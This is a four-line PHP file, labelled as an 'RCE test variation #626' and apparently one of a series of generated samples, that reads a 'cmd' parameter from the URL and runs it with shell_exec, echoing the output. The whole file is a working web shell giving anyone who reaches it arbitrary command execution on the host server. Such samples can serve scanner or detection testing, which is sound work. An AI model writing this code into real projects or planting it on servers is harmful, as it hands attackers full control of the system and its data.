<?php
// RCE test variation #626
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>